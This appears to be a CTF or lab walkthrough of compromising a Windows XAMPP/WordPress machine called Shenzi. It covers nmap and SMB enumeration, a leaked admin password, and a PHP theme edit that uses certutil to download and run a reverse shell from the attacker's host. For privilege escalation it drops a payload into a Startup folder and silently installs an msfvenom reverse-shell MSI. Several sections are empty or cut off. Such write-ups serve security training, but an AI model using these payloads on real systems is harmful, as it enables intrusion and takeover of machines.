#Pwned! 
```IP
192.168.171.55
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.171.55 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE       REASON          VERSION                                    21/tcp   open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta   
| ftp-syst:                                                                             |_  SYST: UNIX emulated by FileZilla                                                    80/tcp   open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.171.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.171.55/dashboard/ 
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6 
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds? syn-ack ttl 125
3306/tcp open  mysql?        syn-ack ttl 125
| fingerprint-strings: 
|   DNSStatusRequestTCP, Help, Kerberos, LANDesk-RC, LPDString, NULL, RPCCheck, SMBProgNeg, TLSSessionReq, X11Probe:  
|_    Host '192.168.45.201' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.45.201' is not allowed to connect to this MariaDB server
```

## Nmap UDP


# Enumeration

## HTTP
### Technologies
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028093827.png?raw=true)
img
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028093638.png?raw=true)
phpinfo.php
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028093618.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028093711.png?raw=true)
xampp
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028093746.png?raw=true)
Webdav arbitrary file upload not working
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028100413.png?raw=true)
Remember to use the key words obtained in EVERYTHING even directories:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028110304.png?raw=true)
with admin:FeltHeadwallWight357 we can enter in the wp-admin subdirectory

we can edit php files in the appearance utility
```
<?php $exec = system('certutil -urlcache -f http://192.168.45.201:8000/rev.exe rev.exe && rev.exe', $val) ?>
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028113157.png?raw=true)
we create our revshell ang get a shell
## SMB
enum4linux
```
enum4linux -a -u "guest" -p "" 192.168.171.55
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028095228.png?raw=true)
with a non existant user and password we get
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028100934.png?raw=true)

Files in Shenzi share
http://localhost/test.php
http://localhost/myhome/test.php
 A password file containing credentials and some tokens
```
 522b574a21767922222439295b4b2975
```
```

```
 further enumeration reveals that 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028102220.png?raw=true)
# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028113229.png?raw=true)


## Automated

### Peass
unquoted and allaccess files on startup
C:\Users\shenzi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
iwr http://192.168.45.201:8000/rev1234.exe -outfile .\Start.exe
```
```
copy Start.exe C:\Users\shenzi\AppData\Roaming\Microsoft\Windows\
```
C:\Users\shenzi\AppData\Local\Microsoft\OneDrive\OneDrive.exe
Packages msi are installed automatically
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028160908.png?raw=true)


```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=12134 -f msi -o shell.msi
```
```
$pkg = 'C:\Users\shenzi\shell.msi'
```
```
start-process msiexec "/i $pkg /qn"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241028161423.png?raw=true)

### Mimikatz


